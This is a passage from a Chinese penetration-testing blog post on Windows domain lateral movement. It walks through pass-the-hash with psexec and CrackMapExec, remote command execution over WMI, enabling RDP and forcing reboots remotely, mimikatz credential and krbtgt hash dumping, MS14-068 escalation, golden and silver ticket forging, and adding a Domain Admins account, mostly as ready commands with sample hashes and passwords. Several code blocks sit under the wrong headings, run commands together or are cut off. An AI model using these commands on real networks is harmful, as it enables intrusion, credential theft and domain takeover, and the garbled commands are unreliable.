+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py darkid/Administrator@<span class="number">192.168</span>.<span class="number">0.142</span></span><br></pre></td></tr></table></figure>
+
+<p>执行命令后输入密码</p>
+<p>登陆其他主机管理员</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec /accepteula /s \<span class="number">12</span>server1 <span class="literal">-u</span> Administrator <span class="literal">-p</span> <span class="number">123456</span> cmd</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、msf的smb连接"><a href="#三、msf的smb连接" class="headerlink" title="三、msf的smb连接"></a><strong>三、msf的smb连接</strong></h3><p><strong>1、使用</strong></p>
+<p><strong>2、crackmapexec</strong></p>
+<p>CrackMapExec 可以对 C 段中的主机进行批量 pth,</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec.git">https://github.com/byt3bl33d3r/CrackMapExec.git</a></p>
+<p>使用命令</p>
+<p><strong>四、WMI横向</strong></p>
+<p><strong>1、概述</strong></p>
+<p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的ip.txt 文件中</p>
+<p><strong>2、条件</strong> </p>
+<p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445 端⼝传回显</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 ./Administrator@192.168.0.123</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> SMBUser Administratorset rhosts 192.168.0.141</span><br><span class="line"><span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line">run</span><br><span class="line">crackmapexec smb 192.168.0.0/24 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line">对 192.168.9.0/24 C 段进行批量 pass the <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3、wmi使用命令</strong></p>
+<p>通过wmi执行ipconfig命令</p>
+<p>建立ipc连接，读取内容</p>
+<p><strong>4、wmiexec.py利用</strong></p>
+<p>在 impacket 工具包里有 wmiexec.py 脚本，执行 whoami 命令</p>
+<p>【注】wmiexec.py 的 hash 参数格式为 LM Hash:NT Hash aad3b435b51404eeaad3b435b51404ee 这个部分可以随便填写</p>
+<p>wmiexec.py 明文获取 shell</p>
+<p><strong>5、powershell的wmi</strong></p>
+<p>Invoke-WmiCommand</p>
+<p>Invoke-WMIMethod</p>
+<p><strong>6、wmic 的其他命令</strong></p>
+<p>使用 wmic 远程开启目标的 RDP</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">0.123</span> /user:administrator /password:<span class="number">123456</span> <span class="keyword">process</span> call create <span class="string">&quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span>.<span class="number">0.123</span>\ipc<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:administratortype \\<span class="number">192.168</span>.<span class="number">0.123</span>\c<span class="variable">$</span>\ip.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py <span class="literal">-hashes</span> aad3b435b51404eeaad3b435b51404ee:<span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4 Administrator@<span class="number">192.168</span>.<span class="number">0.141</span> <span class="string">&quot;whoami</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py administrator:<span class="number">123456</span>@<span class="number">192.168</span>.<span class="number">0.123</span></span><br></pre></td></tr></table></figure>
+
+<p>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用Powershell 调用WMI 来远程执行命令。在 Powershell 中运行以下命令</p>
+<p><em>#</em> <em>导入</em> <em>Invoke-WmiCommand.ps1</em> <em>脚本</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-WmiCommand.ps1</span><br></pre></td></tr></table></figure>
+
+<p><em>#</em> <em>指定目标系统用户名</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$User = &quot;.\administrator&quot;</span><br></pre></td></tr></table></figure>
+
+<p><em>#</em> <em>指定目标系统的密码</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Password = ConvertTo-SecureString -String &quot;123456&quot; -AsPlainText -Force</span><br></pre></td></tr></table></figure>
+
+<p><em>#</em> <em>将账号和密码整合起来，以便导入</em> <em>Credential</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential-ArgumentList $User,$Password</span><br></pre></td></tr></table></figure>
+
+<p><em>#</em> <em>指定要执行的命令和目标</em> <em>IP</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Remote = Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 192.168.0.123</span><br></pre></td></tr></table></figure>
+
+<p><em>#</em> <em>将执行结果输出到屏幕上</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Remote.PayloadOutput</span><br></pre></td></tr></table></figure>
+
+<p> Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。</p>
+<p><em>#</em> <em>指定目标系统用户名</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$User=&quot;.\administrator&quot;</span><br></pre></td></tr></table></figure>
+
+<p><em>#</em> <em>指定目标系统密码</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Password=ConvertTo-SecureString -String &quot;123456&quot; -AsPlainText -Force</span><br></pre></td></tr></table></figure>
+
+<p><em>#</em> <em>将账号和密码整合起来，以便导入</em> <em>Credential</em> <em>中</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br></pre></td></tr></table></figure>
+
+<p><em>#</em> <em>在远程系统中运行</em> <em><strong>calc.exe</strong></em> <em>命令</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.0.123&quot; -Credential $Cred</span><br></pre></td></tr></table></figure>
+
+<p><em>#</em> <em>适于</em> <em><strong>Windows xp、server 2003</strong></em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.7.7 /user:administrator /password:123456 PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowT</span><br></pre></td></tr></table></figure>
+
+
+
+<p>判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p>
+<p>远程重启</p>
+<h2 id="票据传递攻击（PTT）"><a href="#票据传递攻击（PTT）" class="headerlink" title="票据传递攻击（PTT）"></a>票据传递攻击（PTT）</h2><h3 id="一、域内常用的两种攻击方式："><a href="#一、域内常用的两种攻击方式：" class="headerlink" title="一、域内常用的两种攻击方式："></a><strong>一、域内常用的两种攻击方式：</strong></h3><p><strong>1、黄金票据 Golden ticket</strong></p>
+<p><strong>2、白银票据 Silver ticket</strong></p>
+<h3 id="二、金票-Golden-ticket"><a href="#二、金票-Golden-ticket" class="headerlink" title="二、金票 Golden ticket"></a><strong>二、金票 Golden ticket</strong></h3><p><strong>1、原理</strong></p>
+<p>在 Kerberos 认证中,Client 通过 AS(身份认证服务)认证后,AS 会给 Client 一个Logon Session Key 和 TGT,而 Logon Session Key 并不会保存在 KDC</p>
+<p>中，krbtgt 的NTLM Hash 又是固定的,所以只要得到 krbtgt 的 NTLM Hash，就可以伪造TGT 和Logon Session Key 来进入下一步 Client 与 TGS 的交</p>
+<p>互。而已有了金票后,就跳过AS 验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
+<p><strong>2、特点</strong></p>
+<p>不需要与 AS 进行交互，需要用户 krbtgt 的 Hash</p>
+<p><strong>3、伪造凭据，提升域内普通用户的权限（MS14-068）</strong></p>
+<p>以一个本地 administrator 用户登录域内的一个主机中。</p>
+<p>通过命令：net config workstation,获取域信息</p>
+<p>通过命令：nltest &#x2F;dsgetdc:域名,获取DC主机名</p>
+<p>上传 mimikatz,以管理员权限运行 CMD,再去执行 mimikatz</p>
+<p>利用 MS14-068 来提权,先检查下是否有 MS14-068, CVE 编号 CVE-2014-6324,补丁为3011780 ：<strong>systeminfo |find “3011780”</strong>,如果返回为空就</p>
+<p>说明没有打补丁,存在漏洞,需要注意的是域内普通用户提权成功后是有时效性的。</p>
+<p>上传 mimikatz 和 MS14-068 提权工具，whoami &#x2F;user 或者 whoami&#x2F;all 查看 test用户的SID</p>
+<p>使用 MS14-068 伪造票据</p>
+<p>使用方法</p>
+<p><em>#</em> <em>适于</em> <em><strong>Windows 7、8、10，server 2008、2012、2016</strong>，注意</em> <em><strong>ServerName</strong></em> 需要改为目标的<strong>hostname</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.0.123 /user:administrator /password:123456 RDTOGGLE WHERE ServerName=&#x27;计算机名&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>
+
+<p><em>#或者</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.0.123 /user:administrator /password:123456 process call create &#x27;cmd.exe /c REG ADD &quot;HKLM\SYSTEM\CurrentContro</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnectionswmic /node:192.168.0.141 /user:administrator /password:123456 process call create &quot;shutdown.exe -r -f -t 0&quot;mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt;log.txt</span><br></pre></td></tr></table></figure>
+
+<p><em>#执行命令：</em></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ms14<span class="literal">-068</span>.exe <span class="literal">-u</span> test@moonhack.com <span class="literal">-p</span> <span class="number">123456</span> <span class="literal">-s</span> S<span class="literal">-1-5-21-3439616436-2844000184-3841763578-1105</span> <span class="literal">-d</span> <span class="number">08</span>server<span class="literal">-ad</span>.moonhack.com，</span><br><span class="line">ms14<span class="literal">-068</span>.exe <span class="literal">-u</span> 域成员名<span class="selector-tag">@</span>域名 <span class="literal">-p</span> 域成员密码 <span class="literal">-s</span> 域成员 sid <span class="literal">-d</span> 域控制器地址使用 </span><br><span class="line">mimikatz 清空之前缓存的凭证，导入伪造的凭证：</span><br><span class="line">mimikatz <span class="comment"># kerberos::purge //清空票据</span></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptc 票据文件地址</span></span><br></pre></td></tr></table></figure>
+
+<p>再输入 dir \08server-ad.moonhack.com\c$，发现访问成功，现在我们有域管的权限</p>
+<p>添加域管账号密码</p>
+<p><strong>4、伪造金票</strong></p>
+<p>条件</p>
+<p>使用一下命令导出用户 krbtgt 的 hash：</p>
+<p>利用 mimikatz 生成金票生成.kirbi 文件并保存</p>
+<p><strong>5、金票的使用</strong></p>
+<p>登录域内普通用户，通过 mimikatz 中的 <strong>kerberos::ptt</strong> 功能将 <strong>ticket.kirbi</strong> 导入内存中。</p>
+<p>ipc连接访问</p>
+<h3 id="三、银票-Silver-ticket"><a href="#三、银票-Silver-ticket" class="headerlink" title="三、银票 Silver ticket"></a><strong>三、银票 Silver ticket</strong></h3><p><strong>1、原理</strong></p>
+<p>如果说黄金票据是伪造的 TGT,那么白银票据就是伪造的 ST。在 Kerberos 认证的第三部，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进</p>
+<p>行请求，Server 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST,从而获得Session Key。通过 Session Key 解密 Authenticator3,进而验证对</p>
+<p>方的身份,验证成功就让 Client 访问 server 上的指定服务了。所以我们只需要知道 Server 用户的 Hash 就可以伪造出一个 ST,且不会经过 KDC,但是伪</p>
+<p>造的门票只对部分服务起作用。</p>
+<p><strong>2、特点</strong></p>
+<p>不需要与 KDC 进行交互</p>
+<p>需要 server 的 NTLM hash</p>
+<p><strong>3、kekeo伪造银票</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user moonsec123 Qwe123... /add /domainnet <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> moonsec123 /add /domain</span><br></pre></td></tr></table></figure>
+
+<p>1、域名称</p>
+<p>2、域的 SID 值</p>
+<p>3、域的 KRBTGT 账号的 HASH</p>
+<p>4、伪造任意用户名</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::dcsync /domain:moonhack.com /all /csv</span></span><br><span class="line">或 lsadump::lsa /inject</span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::dcsync /domain:moonhack.com /user:krbtgt</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::dcsync /domain:moonsec.fbi /all /csv&quot;</span> <span class="string">&quot;exit&quot;</span>&gt;loghash.txt</span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::golden /admin:system /domain:moonhack.com /sid:S-1-5-21-3439616436-2844000184-3841763578 /krbtgt:4c1d576</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;admin：伪造的用户名</p>
+<p>&#x2F;domain：域名称</p>
+<p>&#x2F;sid：SID 值，注意是去掉最后一个-后面的值</p>
+<p>&#x2F;krbtgt：krbtgt 的 HASH 值</p>
+<p>&#x2F;ticket：生成的票据名称 &#x2F;&#x2F;不是写入内存中的命令！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purgemimikatz # kerberos::ptt C:\Users\test\ticket.kirbidir \\08server1.moonhack.com\c$</span><br></pre></td></tr></table></figure>
+
+<h3 id="四、金票和银票的区别"><a href="#四、金票和银票的区别" class="headerlink" title="四、金票和银票的区别"></a><strong>四、金票和银票的区别</strong></h3><p><strong>1、获取的权限不同</strong></p>
+<p>金票：伪造的 TGT，可以获取任意 Kerberos 的访问权限</p>
+<p>银票：伪造的 ST，只能访问指定的服务，如 CIFS</p>
+<p><strong>2、认证流程不同</strong></p>
+<p>金票：同 KDC 交互，但不同 AS 交互</p>
+<p>银票：不同 KDC 交互，直接访问 Server</p>
+<p><strong>3、加密方式不同</strong></p>
+<p>金票：由 krbtgt NTLM Hash 加密</p>
+<p>银票：由服务账号 NTLM Hash 加密</p>
+<p><em>#制作</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:administrator /domain:moonsec.fbi /ntlm:42e2656ec24331269f82160ff5962387// tgt::ask /user:用户名 /domain:域名 /ntlm:NTLM Hash</span><br></pre></td></tr></table></figure>
+
+<p><em>#导入</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGT_administrator@MOONSEC.FBI_krbtgt~moonsec.fbi@MOONSEC.FBI.kirb</span><br></pre></td></tr></table></figure>
+
+<p>参考来自暗月</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io">0000FF</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io/2023/01/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8Ftips/">https://chr1sto4f.github.io/2023/01/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8Ftips/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://chr1sto4f.github.io" target="_blank">0000FF's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220402171614_50e92.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/26/payloads-all-the-things/"><img class="prev-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220402171614_50e92.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">payloads all the things</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/25/Flask-Session%E4%BC%AA%E9%80%A0/"><img class="next-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.bbc9bb46ff676e0ae3c933639d8ecb1e.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Flask Session伪造</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/01/18/2022%E5%B9%B4Kubernetes%E4%B8%BB%E8%A6%81%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" title="2022年Kubernetes主要漏洞汇总"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-18</div><div class="title">2022年Kubernetes主要漏洞汇总</div></div></a></div><div><a href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-30</div><div class="title">Windows提权漏洞合集and域渗透历史漏洞整理</div></div></a></div><div><a href="/2020/11/10/Windows%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81/" title="Windows用户凭证"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.bbc9bb46ff676e0ae3c933639d8ecb1e.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-10</div><div class="title">Windows用户凭证</div></div></a></div><div><a href="/2020/11/10/wmic/" title="wmic"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-10</div><div class="title">wmic</div></div></a></div><div><a href="/2020/11/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网渗透之信息搜集"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a4385dd85202d7ff20f912bb5c675214.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-10</div><div class="title">内网渗透之信息搜集</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0000FF</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Chr1sTo4F"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Chr1sTo4F" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:Chr1sTo4F@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">考研一战成硕</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/" title="hvv面经"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/8080d89c2ceb3204.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hvv面经"/></a><div class="content"><a class="title" href="/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/" title="hvv面经">hvv面经</a><time datetime="2023-02-12T06:37:08.000Z" title="发表于 2023-02-12 14:37:08">2023-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DerpNStink-1"/></a><div class="content"><a class="title" href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1">DerpNStink-1</a><time datetime="2023-02-04T06:47:32.000Z" title="发表于 2023-02-04 14:47:32">2023-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows提权漏洞合集and域渗透历史漏洞整理"/></a><div class="content"><a class="title" href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理">Windows提权漏洞合集and域渗透历史漏洞整理</a><time datetime="2023-01-30T04:27:55.000Z" title="发表于 2023-01-30 12:27:55">2023-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="微信小程序信息收集"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/t01db9bc29a66401694.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="微信小程序信息收集"/></a><div class="content"><a class="title" href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="微信小程序信息收集">微信小程序信息收集</a><time datetime="2023-01-27T06:06:28.000Z" title="发表于 2023-01-27 14:06:28">2023-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/26/Lord-Of-The-Root-1-0-1/" title="Lord Of The Root-1.0.1"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lord Of The Root-1.0.1"/></a><div class="content"><a class="title" href="/2023/01/26/Lord-Of-The-Root-1-0-1/" title="Lord Of The Root-1.0.1">Lord Of The Root-1.0.1</a><time datetime="2023-01-26T09:58:02.000Z" title="发表于 2023-01-26 17:58:02">2023-01-26</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #ccc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 0000FF</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
